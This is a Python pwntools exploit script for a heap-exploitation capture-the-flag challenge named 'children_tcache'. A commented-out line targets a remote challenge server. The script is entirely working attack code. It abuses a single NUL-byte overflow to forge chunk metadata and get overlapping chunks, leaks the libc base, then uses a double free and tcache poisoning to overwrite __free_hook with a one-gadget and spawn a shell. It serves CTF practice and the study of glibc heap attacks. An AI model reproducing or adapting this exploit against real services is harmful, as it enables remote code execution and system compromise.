from pwn import *

r = process("./children_tcache")
#r = remote("54.178.132.125",8763)
pointers = [False]*10

def menu():
    print r.recvuntil("choice: ") 

def new_heap(size, data):
    #find idx
    global pointers
    idx = None
    for i in range(10):
        if not pointers[i]:
            pointers[i] = True
            idx = i
            break
    assert(idx is not None)
	
    r.send("1")
    print r.recvuntil("Size:")
    r.send(str(size))
    print r.recvuntil("Data:")
    r.send(data)
    menu()
    return idx
	
def show_heap(idx):
    r.send("2")
    print r.recvuntil("Index:")
    r.send(str(idx))
    menu()
	
def show_heap_leak(idx):
    r.send("2")
    print r.recvuntil("Index:")
    r.send(str(idx))
    data = r.recvuntil("choice: ")
    addr = data.split("\n")[0]
    addr = addr.ljust(8,"\x00")
    return u64(addr)
	
	
def delete_heap(idx):
    global pointers
    assert (pointers[idx]==True)
    pointers[idx]=False
	
    r.send("3")
    print r.recvuntil("Index:")
    r.send(str(idx))
    menu()
    return None
	
def delete_heap_and_shell(idx):
    global pointers
    assert (pointers[idx]==True)
    pointers[idx]=False
	
    r.send("3")
    print r.recvuntil("Index:")
    r.send(str(idx))
    r.interactive()

tcache1 = [None]*10
tcache2 = [None]*10
	
menu()
a = new_heap(0x108,"a"*10)
b = new_heap(0xf8,"b"*10)
c = new_heap(0xf8,"c"*10)

gdb.attach(r)
# make 0xf8 tcache full
for i in range(7):
    tcache1[i] = new_heap(0xF8, "sss"+str(i))
for i in range(7):
    tcache1[i] = delete_heap(tcache1[i])

# make 0x108 tcache full 
for i in range(7):
    tcache2[i] = new_heap(0x108, "sss"+str(i))
for i in range(7):
    tcache2[i] = delete_heap(tcache2[i])

gdb.attach(r)
a = delete_heap(a) #a goes to an unsorted bin

tcache1[0] = new_heap(0xF8, "sss0") #create one free place in 0xf8 tcache

# buffer overflow by 1 NULL byte
b = delete_heap(b);
b = new_heap(0xf8,"b"*0xf8) #clear prev in use of c

# Clear prev size
# This is tricki because data to chunk is copied by strcpy which 
# stops copying on NULL byte.
# If we want to clean an region we need to free and allocate several
# chunks that each next size is lower than 1 byte.  
for i in range(0xf8, 0xf3, -1):
    b = delete_heap(b);
    b = new_heap(i-1,(i-1)*"b")

# set prev_size of c to 0x210 bytes
b = delete_heap(b);
b = new_heap(0xF2,"b"*0xf0+"\x10\x02")

# make 0xf8 tcache full
tcache1[0] = delete_heap(tcache1[0])

# c have prev_in_use=0 and prev_size=0x210 so it will consolidate
# with a and b and it will be put in unsorted bin
c = delete_heap(c)

# make 0x108 tcache empty
for i in range(7):
    tcache2[i] = new_heap(0x108, "sss"+str(i))

# now we allocate chunks from area of  a|b|c
A = new_heap(0x108, "AAA")

# leak libc
addr=show_heap_leak(b)
libc_base = addr - 0x3ebca0
free_hook = libc_base + 0x3ed8e8
print "libc base = "+hex(libc_base)
print "free hook = "+hex(free_hook)


# make 0x108 tcache full because we can have max 10 chunks allocated
for i in range(7):
    tcache2[i] = delete_heap(tcache2[i])

# Both 0xf8 and 0x108 tcache bins are ful
	
ADDR_TO_WRITE = free_hook	

# let's allocate chunk that overlaps b.
B = new_heap(0x1f8, "BBB")

# now, chunks B and b are allocated and have the same address. 
# We can use double free and tcache poisoning attack

# double free
delete_heap(B)
delete_heap(b)
# now 0x1F8 tcache bin contains 2 the same chunks

# allocate one of them and set next pointer to known address
b = new_heap(0x1f8, p64(ADDR_TO_WRITE))

new_heap(0x1f8, "kkkk")

# allocated chunk will have an address of &__free_hook, 
# overwrite __free_hook to one-gadget RCE there
super_pointer = new_heap(0x1f8, p64(libc_base + 0x04F322))

# trigger __free_hook that is overwritten to one-gadget RCE
delete_heap_and_shell(b)
